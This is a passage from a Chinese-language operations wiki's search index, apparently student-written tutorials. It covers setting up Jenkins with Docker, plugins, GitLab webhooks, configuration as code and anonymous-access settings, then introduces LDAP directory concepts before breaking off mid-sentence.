jenkins:\n    image: jenkins/jenkins\n    environment:\n      - JAVA_OPTS=\"-Djenkins.install.runSetupWizard=false\"\n    ports:\n      - \"8080:8080\"\n</code></pre> <p>\u7136\u540e\u8bbf\u95ee <code>http://localhost:8080</code>\u3002</p> <p></p> <p>Jenkins \u7684\u529f\u80fd\u4f9d\u9760\u5404\u79cd\u63d2\u4ef6\u652f\u6301\u3002\u70b9\u51fb\u5de6\u4fa7 Manage Jenkins - Plugins - Available plugins\uff0c\u641c\u7d22\u5e76\u5b89\u88c5 Git \u63d2\u4ef6\uff0c\u8fd9\u6837 Jenkins \u5c31\u80fd\u591f\u4ece Git \u4ed3\u5e93\u62c9\u53d6\u4ee3\u7801\u3002</p> <p></p> <p>Tip</p> <p>\u5982\u679c\u4f60\u7684\u7f51\u7edc\u73af\u5883\u4e0d\u597d\uff0c\u53ef\u4ee5\u5728 Plugins - Advanced Settings \u4e2d\u5c06 Update Site \u6539\u4e3a <code>http://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json</code>\u3002</p>","tags":["stable"]},{"location":"operation/system/service/jenkins/#freestyle-\u4efb\u52a1","title":"Freestyle \u4efb\u52a1","text":"<p>\u63a5\u4e0b\u6765\u6211\u4eec\u8981\u8ba9 Jenkins \u4ece Git \u4ed3\u5e93\u62c9\u53d6\u4ee3\u7801\u5e76\u6267\u884c\u6784\u5efa\u3002</p> <p>\u9996\u5148\uff0c\u5728 GitHub \u6216 GitLab \u7b49\u5730\u65b9\u521b\u5efa\u4e00\u4e2a\u516c\u5f00\u4ed3\u5e93\uff08\u4e3a\u4e86\u65b9\u4fbf\u7a0d\u540e\u62c9\u53d6\u4ed3\u5e93\u65f6\u4e0d\u7528\u914d\u7f6e SSH \u5bc6\u94a5\uff09\u3002\u5728\u4ed3\u5e93\u91cc\u6dfb\u52a0\u4e00\u4e2a\u7b80\u5355\u7684\u811a\u672c\uff0c\u6bd4\u5982\uff1a</p> build.sh<pre><code>echo \"Hello, Jenkins!\"\n</code></pre> <p>\u56de\u5230 Jenkins \u9996\u9875\uff0c\u70b9\u51fb Create a job\uff0c\u521b\u5efa\u4e00\u4e2a Freestyle project\u3002\u8fd9\u662f Jenkins \u4e2d\u6700\u7b80\u5355\u7684\u4efb\u52a1\u7c7b\u578b\uff0c\u5df2\u7ecf\u80fd\u591f\u6ee1\u8db3\u6211\u4eec\u7684\u9700\u6c42\u3002</p> <p>\u521b\u5efa\u6210\u529f\u540e\u6765\u5230\u4efb\u52a1\u7684 Configure \u754c\u9762\u3002\u5728\u8fd9\u91cc\u6211\u4eec\u914d\u7f6e\u4efb\u52a1\u7684\u5404\u79cd\u5c5e\u6027\uff0c\u6bd4\u5982\u6e90\u7801\u7ba1\u7406\u3001\u6784\u5efa\u89e6\u53d1\u5668\u3001\u6784\u5efa\u6b65\u9aa4\u7b49\u3002</p> <ul> <li>\u62c9\u53d6\u6e90\u7801\uff1a\u5728 Source Code Management \u4e2d\u9009\u62e9 Git\uff0c\u586b\u5199\u4ed3\u5e93\u5730\u5740\u3002</li> <li>\u89e6\u53d1\u5668\uff1a\u5728 Triggers \u4e2d\u53ef\u4ee5\u914d\u7f6e\u5b9a\u65f6\u6784\u5efa\u3001\u5411 SCM \u8f6e\u8be2\u7b49\u3002\u4f60\u53ef\u4ee5\u6309\u7167\u9875\u9762\u4e0a\u7684\u63d0\u793a\u914d\u7f6e\uff0c\u8fd9\u91cc\u5c31\u4e0d\u505a\u6f14\u793a\u3002</li> <li> <p>\u6784\u5efa\u6b65\u9aa4\uff1a\u5728 Build Steps \u4e2d\u6dfb\u52a0\u6784\u5efa\u6b65\u9aa4\uff0c\u9009\u62e9\u7c7b\u578b\u4e3a Execute shell\uff0c\u586b\u5199\u6784\u5efa\u811a\u672c\u7684\u5185\u5bb9\uff0c\u6bd4\u5982 <code>sh build.sh</code>\u3002</p> <p></p> </li> <li> <p>\u4fdd\u5b58\uff1a\u70b9\u51fb Save \u4fdd\u5b58\u4efb\u52a1\u914d\u7f6e\u3002</p> </li> </ul> <p>\u70b9\u51fb\u5de6\u4fa7\u7684 Build Now \u7acb\u5373\u6267\u884c\u6784\u5efa\uff0cJenkins \u5c31\u4f1a\u5148\u62c9\u53d6\u4ee3\u7801\uff0c\u7136\u540e\u6267\u884c\u6784\u5efa\u6b65\u9aa4\u3002</p> <p>Jenkins \u4f1a\u4e3a\u6bcf\u6b21\u6784\u5efa\u751f\u6210\u4e00\u4e2a\u6784\u5efa\u53f7\uff0c\u4f60\u53ef\u4ee5\u70b9\u51fb\u6784\u5efa\u53f7\u67e5\u770b\u6784\u5efa\u7684\u8be6\u60c5\uff0c\u5728\u5176\u4e2d\u7684 Console Output \u4e2d\u67e5\u770b\u6784\u5efa\u7684\u8f93\u51fa\uff0c\u5728 Changes \u4e2d\u67e5\u770b\u672c\u6b21\u6784\u5efa\u7684\u53d8\u66f4\uff08\u4e00\u822c\u7531 Git \u63d0\u4ea4\u8bb0\u5f55\u751f\u6210\uff09\u3002</p>","tags":["stable"]},{"location":"operation/system/service/jenkins/#gitlab-\u89e6\u53d1\u6784\u5efa","title":"GitLab \u89e6\u53d1\u6784\u5efa","text":"<p>\u63a5\u4e0b\u6765\u6211\u4eec\u5e0c\u671b\u5f53 GitLab \u4ed3\u5e93\u6709\u65b0\u7684\u63d0\u4ea4\u65f6\uff0cJenkins \u80fd\u81ea\u52a8\u6784\u5efa\u3002\u8fd9\u5c31\u9700\u8981\u4f7f\u7528 GitLab Plugin \u63d2\u4ef6\u3002\u5b83\u5728 Triggers \u4e2d\u65b0\u589e\u4e86 GitLab Webhook\uff0c\u4f60\u4f1a\u770b\u89c1\u591a\u51fa\u4e86\u8fd9\u6837\u7684\u9009\u9879\uff1a</p> <p>Build when a change is pushed to GitLab. GitLab webhook URL: https://jenkins.clusters.zjusct.io/project/chroot-debian-sid</p> <ul> <li>Push Evnets</li> <li>Merge Request Events</li> <li>...</li> </ul> <p>\u5c06 Webhook URL \u590d\u5236\u5230 GitLab \u4ed3\u5e93\u7684\u96c6\u6210 - Jenkins \u8bbe\u7f6e\u4e2d\uff0c\u6309 GitLab \u7684\u63d0\u793a\u914d\u7f6e\u7528\u6237\u540d\u5bc6\u7801\u7b49\u5373\u53ef\u3002\u6b64\u540e\uff0c\u5982\u679c\u4f60\u5411 GitLab \u4ed3\u5e93\u63a8\u9001\u4ee3\u7801\uff0cGitLab \u5c31\u4f1a\u5411 Jenkins \u53d1\u9001 Webhook \u8bf7\u6c42\uff0c\u89e6\u53d1 Jenkins \u6784\u5efa\u3002</p>","tags":["stable"]},{"location":"operation/system/service/jenkins/#\u63a8\u9001\u6784\u5efa\u7ed3\u679c\u5230-gitlab","title":"\u63a8\u9001\u6784\u5efa\u7ed3\u679c\u5230 GitLab","text":"<p>\u8bf7\u9605\u8bfb GitLab Plugin \u6587\u6863\u3002\u8fd9\u91cc\u7ed9\u51fa\u5927\u81f4\u7684\u6b65\u9aa4\uff1a</p> <ul> <li>\u5728 GitLab \u4e2d\u521b\u5efa Access Token\u3002\u53ef\u4ee5\u662f Personal Access Token\uff0c\u4e5f\u53ef\u4ee5\u662f Project Access Token\u3002\u8be5 Token \u9700\u8981\u4e3a\u9879\u76ee\u7684 Maintainer\uff0c\u5e76\u81f3\u5c11\u5177\u6709 <code>api</code> \u6743\u9650\u3002</li> <li>\u5728 Jenkins \u4e2d\u6dfb\u52a0 GitLab API Token \u51ed\u636e\u3002</li> <li>\u5728 Jenkins System \u4e2d\u8bbe\u7f6e GitLab Connection\uff0c\u586b\u5199 GitLab \u670d\u52a1\u5668\u5730\u5740\uff0c\u9009\u62e9\u5bf9\u5e94\u7684 GitLab API Token \u51ed\u636e\u3002</li> <li>\u5728 Jenkins \u4efb\u52a1\u7684 General \u4e2d\u9009\u62e9\u4e00\u4e2a GitLab Connection\uff0c\u5728 Post-build Actions \u4e2d\u9009\u62e9\u53d1\u5e03\u5230 GitLab\u3002</li> <li>\u6267\u884c\u6784\u5efa\uff0c\u67e5\u770b\u6784\u5efa\u7ed3\u679c\u662f\u5426\u6210\u529f\u53d1\u5e03\u5230 GitLab\u3002</li> </ul>","tags":["stable"]},{"location":"operation/system/service/jenkins/#jenkins-\u914d\u7f6e\u4e0e\u7ef4\u62a4","title":"Jenkins \u914d\u7f6e\u4e0e\u7ef4\u62a4","text":"<pre><code>- [Initial Settings - Jenkins](https://www.jenkins.io/doc/book/installing/initial-settings/)\n</code></pre> <p>\u901a\u8fc7\u4e0a\u9762\u7684\u7ec3\u4e60\uff0c\u4f60\u5df2\u7ecf\u638c\u63e1\u4e86 Jenkins \u7684\u57fa\u672c\u64cd\u4f5c\u3002\u73b0\u5728\u6211\u4eec\u8fdb\u4e00\u6b65\u5b66\u4e60 Jenkins \u7684\u914d\u7f6e\u7ba1\u7406\uff0c\u5c06 Jenkins \u914d\u7f6e\u4fdd\u5b58\u4e3a\u4ee3\u7801\uff0c\u4ece\u800c\u5b9e\u73b0\u914d\u7f6e\u7684\u7248\u672c\u63a7\u5236\u548c\u81ea\u52a8\u5316\u3002</p>","tags":["stable"]},{"location":"operation/system/service/jenkins/#\u6784\u5efa\u955c\u50cf\u4ee5\u6dfb\u52a0\u63d2\u4ef6","title":"\u6784\u5efa\u955c\u50cf\u4ee5\u6dfb\u52a0\u63d2\u4ef6","text":"<p>\u9605\u8bfb  jenkinsci/docker: Docker official jenkins repo\uff0c\u4e86\u89e3\u5982\u4f55\u8bbe\u7f6e Update center \u548c\u5b89\u88c5\u81ea\u5df1\u7684\u63d2\u4ef6\u3002\u4f60\u4e5f\u53ef\u4ee5\u9605\u8bfb\u4e00\u4e2a\u5b9e\u9645\u7684\u4f8b\u5b50  emnify/jenkins-casc-docker\u3002</p>","tags":["stable"]},{"location":"operation/system/service/jenkins/#jenkins-casc","title":"Jenkins CasC","text":"<p>Quote</p> <ul> <li>Configuration as Code - Jenkins plugin</li> </ul> <p>Jenkins CasC \u63d2\u4ef6\u5141\u8bb8\u7528\u6237\u5c06 Jenkins \u914d\u7f6e\u4fdd\u5b58\u4e3a YAML \u6587\u4ef6\u3002\u8fd9\u6837\u53ef\u4ee5\u66f4\u597d\u5730\u7ba1\u7406 Jenkins \u914d\u7f6e\uff0c\u4e5f\u65b9\u4fbf\u5907\u4efd\u548c\u6062\u590d\u3002\u5b83\u80fd\u7ba1\u7406 Jenkins \u81ea\u8eab\u548c\u63d2\u4ef6\u7684\u914d\u7f6e\u3002</p> <p>\u9605\u8bfb  emnify/jenkins-casc-docker\uff0c\u8fd9\u4e2a\u9879\u76ee\u5341\u5206\u7b80\u6d01\u5730\u5c55\u793a\u4e86\u5982\u4f55\u4f7f\u7528 Jenkins CasC \u63d2\u4ef6\u3002</p> <p>\u5b9e\u9645\u90e8\u7f72\u65f6\u53ef\u4ee5\u8fdb\u4e00\u6b65\u8fdb\u884c\u7cbe\u7b80\uff0c\u5220\u53bb\u5982 <code>material-theme</code> \u7b49\u5df2\u7ecf\u65e0\u6cd5\u5728\u65b0\u7248 Jenkins \u4f7f\u7528\u7684\u63d2\u4ef6\u3002\u6b64\u5916\u9879\u76ee\u4e2d\u6ca1\u6709\u4ecb\u7ecd\u672c\u5730\u8d26\u6237\u7684\u914d\u7f6e\uff0c\u8fd9\u5f88\u7b80\u5355\uff1a</p> <pre><code>jenkins:\n  securityRealm:\n    local:\n      allowsSignup: false\n      users:\n        - id: \"admin\"\n          password: \"admin\"\n</code></pre>","tags":["stable"]},{"location":"operation/system/service/jenkins/#jenkins-job-builder","title":"Jenkins Job Builder","text":"<p>Quote</p> <ul> <li>Jenkins Job Builder \u2014 Jenkins Job Builder documentation</li> </ul> <p>\u6211\u4eec\u5df2\u7ecf\u5c06 Jenkins \u914d\u7f6e\u4fdd\u5b58\u4e3a\u4ee3\u7801\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u5c06 Jenkins \u4efb\u52a1\u4e5f\u4fdd\u5b58\u4e3a\u4ee3\u7801\u3002Jenkins Job Builder \u662f\u4e00\u4e2a\u7528\u4e8e\u7ba1\u7406 Jenkins \u4efb\u52a1\u7684\u5de5\u5177\uff0c\u5b83\u4f7f\u7528 YAML \u6587\u4ef6\u6765\u63cf\u8ff0 Jenkins \u4efb\u52a1\u3002</p> <p>\u4e0b\u9762\u7684\u4f8b\u5b50\u5c55\u793a\u4e86\u524d\u6587 Jenkins \u5165\u95e8\u4e2d\u6211\u4eec\u521b\u5efa\u7684\u7b80\u5355\u9879\u76ee\u3002\u4f60\u53ef\u4ee5\u501f\u52a9 Job Definitions \u2014 Jenkins Job Builder documentation \u6587\u6863\u5c1d\u8bd5\u7406\u89e3\u4e0b\u9762\u7684\u914d\u7f6e\uff1a</p> <pre><code>- job:\n    name: \"test\"\n    scm:\n      - git:\n          url: \"your-git-repo-url\"\n          branches:\n            - origin/main\n    triggers:\n      - gitlab\n    builders:\n      - shell: \"sh build.sh\"\n</code></pre> <p>\u4e86\u89e3\u4e86\u4efb\u52a1\u7684\u914d\u7f6e\u540e\uff0c\u5c31\u53ef\u4ee5\u9605\u8bfb Configuration File \u2014 Jenkins Job Builder documentation \u4e86\u89e3\u600e\u4e48\u914d\u7f6e\u8fd0\u884c Jenkins Job Builder\u3002\u6211\u4eec\u9700\u8981\u5199\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\uff0c\u544a\u8bc9 Jenkins Job Builder \u9700\u8981\u914d\u7f6e\u4efb\u52a1\u7684 Jenkins \u670d\u52a1\u5668\u5730\u5740\u3001\u7528\u6237\u540d\u5bc6\u7801\u7b49\u4fe1\u606f\u3002\u7136\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528 <code>jenkins-jobs</code> \u547d\u4ee4\u5c06\u4efb\u52a1\u914d\u7f6e\u5e94\u7528\u5230 Jenkins \u670d\u52a1\u5668\u4e0a\u3002</p>","tags":["stable"]},{"location":"operation/system/service/jenkins/#\u533f\u540d\u8bbf\u95ee\u4e0e\u5b89\u5168","title":"\u533f\u540d\u8bbf\u95ee\u4e0e\u5b89\u5168","text":"<p>Quote</p> <ul> <li>Be aware of anonymous user read access in Jenkins - Aubergine</li> <li>anonymous access to jenkins workspaces - Stack Overflow</li> </ul> <p>\u4f7f\u7528 Matrix Authorization Strategy \u63d2\u4ef6\uff0c\u53ef\u4ee5\u66f4\u7ec6\u7c92\u5ea6\u5730\u63a7\u5236\u7528\u6237\u6743\u9650\u3002\u4e0b\u8f7d\u63d2\u4ef6\u540e\uff0c\u5728\u5b89\u5168\u8bbe\u7f6e\u4e2d\u53ef\u4ee5\u6dfb\u52a0\u533f\u540d\u7528\u6237\u5e76\u8bbe\u7f6e\u5176\u6743\u9650\u3002\u4e3a\u4e86\u8ba9\u533f\u540d\u7528\u6237\u80fd\u591f\u67e5\u770b\u57fa\u672c\u7684\u4efb\u52a1\u6784\u5efa\u72b6\u6001\uff0c\u9700\u8981\u8d4b\u4e88 Overall\u3001Job \u548c View \u7684 Read \u6743\u9650\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\u5e94\u5f53\u5173\u95ed Job/Workspace \u7684\u533f\u540d\u8bbf\u95ee\u6743\u9650\uff0c\u5426\u5219\u533f\u540d\u7528\u6237\u53ef\u4ee5\u67e5\u770b\u5de5\u4f5c\u533a\u7684\u6587\u4ef6\u3002\u5176\u4e2d\u5f88\u53ef\u80fd\u5305\u542b\u654f\u611f\u4fe1\u606f\u3002</p>","tags":["stable"]},{"location":"operation/system/service/ldap/","title":"\u76ee\u5f55\u670d\u52a1\uff1aLDAP","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/ldap/#\u76ee\u5f55\u670d\u52a1ldap","title":"\u76ee\u5f55\u670d\u52a1\uff1aLDAP","text":"<p>Quote</p> <ul> <li>LDAP.com</li> <li>RFC 4510 - Lightweight Directory Access Protocol (LDAP): Technical Specification Road Map</li> <li>Chapter 3 LDAP Schemas, ObjectClasses and Attributes - zytrax</li> </ul> <p>Tip</p> <p>\u9605\u8bfb\u672c\u6587\u524d\uff0c\u4f60\u6700\u597d\u5df2\u7ecf\u4fee\u8bfb\u8fc7\u300a\u6570\u636e\u5e93\u7cfb\u7edf\u300b\u6216\u8005\u4e86\u89e3\u6570\u636e\u5e93\u7cfb\u7edf\u7684\u57fa\u672c\u6982\u5ff5\u3002</p> <p>LDAP \u8f7b\u91cf\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff08Lightweight Directory Access Protocol\uff09\u662f\u4e00\u79cd\u7528\u4e8e\u8bbf\u95ee\u548c\u7ef4\u62a4\u5206\u5e03\u5f0f\u76ee\u5f55\u4fe1\u606f\u670d\u52a1\u7684\u534f\u8bae\u3002LDAP \u662f\u4e00\u79cd\u5ba2\u6237\u7aef - \u670d\u52a1\u5668\u534f\u8bae\uff0c\u5ba2\u6237\u7aef\u901a\u8fc7 LDAP \u534f\u8bae\u5411\u670d\u52a1\u5668\u8bf7\u6c42\u4fe1\u606f\uff0c\u670d\u52a1\u5668\u901a\u8fc7 LDAP \u534f\u8bae\u8fd4\u56de\u4fe1\u606f\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/ldap/#\u76ee\u5f55\u670d\u52a1-directory-service","title":"\u76ee\u5f55\u670d\u52a1 Directory Service","text":"<p>\u76ee\u5f55\u670d\u52a1\u662f\u4e00\u4e2a\u50a8\u5b58\u3001\u7ec4\u7ec7\u548c\u63d0\u4f9b\u4fe1\u606f\u8bbf\u95ee\u670d\u52a1\u7684\u8f6f\u4ef6\u7cfb\u7edf\u3002\u5728\u8f6f\u4ef6\u5de5\u7a0b\u4e2d\uff0c\u4e00\u4e2a\u76ee\u5f55\u662f\u6307\u4e00\u7ec4\u540d\u5b57\u548c\u503c\u7684\u6620\u5c04\u3002\u5b83\u5141\u8bb8\u6839\u636e\u4e00\u4e2a\u7ed9\u51fa\u7684\u540d\u5b57\u6765\u67e5\u627e\u5bf9\u5e94\u7684\u503c\uff0c\u4e0e\u8bcd\u5178\u76f8\u4f3c\u3002\u50cf\u8bcd\u5178\u4e2d\u6bcf\u4e00\u4e2a\u8bcd\u4e5f\u8bb8\u4f1a\u6709\u591a\u4e2a\u8bcd\u4e49\uff0c\u5728\u4e00\u4e2a\u76ee\u5f55\u4e2d\uff0c\u4e00\u4e2a\u540d\u5b57\u4e5f\u8bb8\u4f1a\u4e0e\u591a\u4e2a\u4e0d\u540c\u7684\u4fe1\u606f\u76f8\u5173\u8054\u3002\u7c7b\u4f3c\u5730\uff0c\u5c31\u50cf\u4e00\u4e2a\u8bcd\u4f1a\u6709\u591a\u4e2a\u4e0d\u540c\u7684\u53d1\u97f3\u548c\u591a\u4e2a\u4e0d\u540c\u7684\u8bcd\u4e49\uff0c\u76ee\u5f55\u4e2d\u7684\u4e00\u4e2a\u540d\u5b57\u53ef\u80fd\u4f1a\u6709\u591a\u4e2a\u4e0d\u540c\u7c7b\u578b\u7684\u503c\u3002</p> <p>\u76ee\u5f55\u4e5f\u8bb8\u53ea\u63d0\u4f9b\u8303\u56f4\u975e\u5e38\u5c0f\u7684\u8282\u70b9\u7c7b\u578b\u548c\u6570\u503c\u7c7b\u578b\uff0c\u4e5f\u53ef\u80fd\u5bf9\u4efb\u610f\u7684\u6216\u53ef\u6269\u5c55\u7684\u4e00\u7ec4\u7c7b\u578b\u63d0\u4f9b\u652f\u6301\u3002\u5728\u4e00\u4e2a\u7535\u8bdd\u76ee\u5f55\u4e2d\uff0c\u8282\u70b9\u5c31\u662f\u59d3\u540d\u800c\u6570\u503c\u9879\u5c31\u662f\u7535\u8bdd\u53f7\u7801\u3002\u5728 DNS \u4e2d\uff0c\u8282\u70b9\u662f\u57df\u540d\u800c\u6570\u503c\u9879\u662f IP \u5730\u5740\uff08\u8fd8\u6709\u522b\u540d\uff0c\u90ae\u4ef6\u670d\u52a1\u5668\u540d\u7b49\u7b49\uff09\u3002\u5728\u4e00\u4e2a\u7f51\u7edc\u64cd\u4f5c\u7cfb\u7edf\u7684\u76ee\u5f55\u4e2d\uff0c\u8282\u70b9\u662f\u90a3\u4e9b\u7531\u64cd\u4f5c\u7cfb\u7edf\u6240\u7ba1\u7406\u7684\u8d44\u6e90\uff0c\u5305\u62ec\u7528\u6237\u3001\u8ba1\u7b97\u673a\u3001\u6253\u5370\u673a\u548c\u5176\u5b83\u5171\u4eab\u8d44\u6e90\u3002</p> <p>\u5728\u76ee\u5f55\u670d\u52a1\u4e2d\uff0c\u4fe1\u606f\u662f\u6309\u7167\u6811\u72b6\u7ed3\u6784\u7ec4\u7ec7\u7684\uff0c\u8fd9\u4e0e MySQL \u7b49\u5173\u7cfb\u578b\u6570\u636e\u5e93\u7684\u8868\u72b6\u7ed3\u6784\u4e0d\u540c\u3002\u6811\u72b6\u7ed3\u6784\u7684\u6bcf\u4e00\u4e2a\u8282\u70b9\u90fd\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u5b50\u8282\u70b9\uff0c\u6bcf\u4e00\u4e2a\u8282\u70b9\u90fd\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u5c5e\u6027\uff0c\u6bcf\u4e2a\u5c5e\u6027\u90fd\u6709\u4e00\u4e2a\u540d\u5b57\u548c\u4e00\u4e2a\u6216\u591a\u4e2a\u503c\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/ldap/#ldap-\u6570\u636e\u6a21\u578b","title":"LDAP \u6570\u636e\u6a21\u578b","text":"<p>\u5728 LDAP \u4e2d\uff0c\u6811\u79f0\u4e3a\u76ee\u5f55\u4fe1\u606f\u6811\uff08Directory Information Tree\uff0cDIT\uff09\uff0c\u6bcf\u4e2a\u8282\u70b9\u79f0\u4e3a\u6761\u76ee\uff08Entry\uff09\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/ldap/#\u6761\u76eeentry","title":"\u6761\u76ee\uff08Entry\uff09","text":"<p>LDAP \u6761\u76ee\u662f\u5173\u4e8e\u5b9e\u4f53\u7684\u4fe1\u606f\u96c6\u5408\u3002\u6bcf\u4e2a\u6761\u76ee\u7531\u4e09\u4e2a\u4e3b\u8981\u7ec4\u6210\u90e8\u5206\u6784\u6210\uff1a</p> <ul> <li>\u533a\u5206\u540d\uff08Distinguished Name\uff0cDN\uff09</li> <li>\u5c5e\u6027\u96c6\u5408</li> <li>\u5bf9\u8c61\u7c7b\u96c6\u5408</li> </ul> <p>\u76ee\u5f55\u670d\u52a1\u6761\u76ee\uff08Directory Service Entry\uff0cDSE\uff09\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u6761\u76ee\uff0c\u5b83\u63d0\u4f9b\u5173\u4e8e\u76ee\u5f55\u670d\u52a1\u5668\u5185\u5bb9\u548c\u529f\u80fd\u7684\u4fe1\u606f\u3002LDAP \u5b9a\u4e49\u4e86\u4e24\u79cd\u7c7b\u578b\u7684 DSE\uff1a</p> <ul> <li>\u6839 DSE\uff08Root DSE\uff09\uff1a\u6839 DSE \u662f LDAP \u76ee\u5f55\u6811\u7684\u9876\u5c42\uff0c\u5b83\u63d0\u4f9b\u4e86\u5173\u4e8e LDAP \u670d\u52a1\u5668\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u5982\u652f\u6301\u7684 LDAP \u7248\u672c\u3001\u652f\u6301\u7684\u8eab\u4efd\u9a8c\u8bc1\u65b9\u6cd5\u3001\u652f\u6301\u7684\u6269\u5c55\u7b49\u3002</li> <li>\u914d\u7f6e DSE\uff08Config DSE\uff09\uff1a\u914d\u7f6e DSE \u5305\u542b\u6709\u5173\u76ee\u5f55\u670d\u52a1\u5668\u914d\u7f6e\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u670d\u52a1\u5668\u652f\u6301\u7684\u6a21\u5f0f\uff08schema\uff09\u548c\u5176\u4ed6\u914d\u7f6e\u53c2\u6570\u3002</li> </ul> <p>\u8fd9\u4e9b DSE \u5728 LDAP \u670d\u52a1\u5668\u4e2d\u4e0d\u5b58\u50a8\u5728\u901a\u5e38\u610f\u4e49\u4e0a\u7684\u76ee\u5f55\u6570\u636e\u4e2d\uff0c\u800c\u662f\u4f5c\u4e3a LDAP \u534f\u8bae\u7684\u4e00\u90e8\u5206\u63d0\u4f9b\u7ed9\u5ba2\u6237\u7aef\u67e5\u8be2\u548c\u83b7\u53d6\u4fe1\u606f\u7684\u63a5\u53e3\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/ldap/#dn","title":"DN","text":"<p>DN \u552f\u4e00\u6807\u8bc6\u8be5\u6761\u76ee\u53ca\u5176\u5728 DIT \u5c42\u6b21\u7ed3\u6784\u4e2d\u7684\u4f4d\u7f6e\u3002LDAP \u6761\u76ee\u7684 DN \u7c7b\u4f3c\u4e8e\u6587\u4ef6\u7cfb\u7edf\u4e0a\u7684\u6587\u4ef6\u8def\u5f84\u3002</p> <p>LDAP DN \u7531\u96f6\u4e2a\u6216\u591a\u4e2a\u76f8\u5bf9\u533a\u5206\u540d\uff08Relative Distinguished Name\uff0cRDN\uff09\u7ec4\u6210\uff0c\u6bcf\u4e2a RDN \u7531\u4e00\u4e2a\u6216\u591a\u4e2a\uff08\u901a\u5e38\u53ea\u6709\u4e00\u4e2a\uff09\u5c5e\u6027 - \u503c\u5bf9\u7ec4\u6210\u3002\u5982\u679c\u4e00\u4e2a RDN \u6709\u591a\u4e2a\u5c5e\u6027 - \u503c\u5bf9\uff0c\u5b83\u4eec\u7528\u52a0\u53f7\u5206\u9694\u3002</p> <p>Example</p> <pre><code>uid=john.doe\n</code></pre> <p>\u8fd9\u662f\u4e00\u4e2a\u7531 <code>uid</code> \u5c5e\u6027\u548c <code>john.doe</code> \u503c\u7ec4\u6210\u7684 RDN\u3002</p> <pre><code>givenName=John+sn=Doe\n</code></pre> <p>\u8fd9\u662f\u4e00\u4e2a\u7531 <code>givenName</code> \u548c <code>sn</code> \u4e24\u4e2a\u5c5e\u6027\u7ec4\u6210\u7684 RDN\u3002</p> <ul> <li>\u7531\u96f6\u4e2a RDN \u7ec4\u6210\u7684 DN \u79f0\u4e3a\u7a7a DN\uff0c\u5b83\u8868\u793a Root DSE\u3002</li> <li>\u5bf9\u4e8e\u5177\u6709\u591a\u4e2a RDN \u7684 DN\uff0c\u6bcf\u4e2a RDN \u6309\u7167\u5411\u6811\u7684\u6839\u90e8\u9760\u8fd1\u7684\u987a\u5e8f\u8868\u793a\u5c42\u6b21\u7ed3\u6784\u7684\u7ea7\u522b\uff0cRDN \u4e4b\u95f4\u7528\u9017\u53f7\u5206\u9694\u3002</li> </ul> <p>Example</p> <pre><code>uid=john.doe,ou=People,dc=example,dc=com\n</code></pre> <p>\u8be5 DN \u6709\u56db\u4e2a RDN\uff0c\u5176\u7236 DN \u4e3a <code>ou=People,dc=example,dc=com</code>\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/ldap/#\u5c5e\u6027","title":"\u5c5e\u6027","text":"<p>\u5c5e\u6027\u4fdd\u5b58\u6761\u76ee\u7684\u6570\u636e\u3002\u6bcf\u4e2a\u5c5e\u6027\u5177\u6709\u4e00\u4e2a\u5c5e\u6027\u7c7b\u578b\u3001\u96f6\u4e2a\u6216\u591a\u4e2a\u5c5e\u6027\u9009\u9879\uff0c\u4ee5\u53ca\u7ec4\u6210\u5b9e\u9645\u6570\u636e\u7684\u4e00\u7ec4\u503c\u3002</p> <ul> <li>\u5c5e\u6027\u7c7b\u578b\uff08attribute type\uff09\uff1a\u53ef\u4ee5\u770b\u4f5c\u662f\u6570\u636e\u5e93\u7684 schema\u3002<ul> <li>\u5bf9\u8c61\u6807\u8bc6\u7b26\uff08Object Identifier\uff0cOID\uff09\uff1a\u5c5e\u6027\u7c7b\u578b\u5fc5\u987b\u6709\u4e00\u4e2a OID\uff0c\u4ee5\u53ca\u96f6\u4e2a\u6216\u591a\u4e2a\u53ef\u7528\u4e8e\u5f15\u7528\u8be5\u7c7b\u578b\u5c5e\u6027\u7684\u540d\u79f0\u3002</li> <li>\u5c5e\u6027\u8bed\u6cd5\uff08attribute syntax\uff09\uff1a\u6307\u5b9a\u53ef\u4ee5\u5b58\u50a8\u5728\u8be5\u7c7b\u578b\u5c5e\u6027\u4e2d\u7684\u6570\u636e\u7c7b\u578b\u3002</li> <li>\u5339\u914d\u89c4\u5219\uff08matching rule\uff09\uff1a\u6307\u5b9a\u5982\u4f55\u6bd4\u8f83\u5c5e\u6027\u503c\u3002</li> <li>\u8fd8\u53ef\u4ee5\u6307\u793a\u5c5e\u6027\u5728\u540c\u4e00\u6761\u76ee\u4e2d\u662f\u5426\u5141\u8bb8\u5177\u6709\u591a\u4e2a\u503c\uff0c\u5e76\u4e14\u5c5e\u6027\u662f\u5426\u7528\u4e8e\u4fdd\u5b58\u7528\u6237\u6570\u636e\uff08\u7528\u6237\u5c5e\u6027\uff09\u6216\u7528\u4e8e\u670d\u52a1\u5668\u64cd\u4f5c\uff08\u64cd\u4f5c\u5c5e\u6027\uff09</li> </ul> </li> <li>\u5c5e\u6027\u9009\u9879\uff08attribute options\uff09\uff1a\u4e0d\u4f5c\u4ecb\u7ecd</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/ldap/#\u5bf9\u8c61\u7c7b","title":"\u5bf9\u8c61\u7c7b","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/ldap/#\u6a21\u5f0fschema","title":"\u6a21\u5f0f\uff08Schema\uff09","text":"<p>LDAP Schema \u81f3\u5c11\u5305\u542b\u4ee5\u4e0b\u5143\u7d20\uff1a</p> <ul> <li>\u5c5e\u6027\u8bed\u6cd5\uff08Attribute 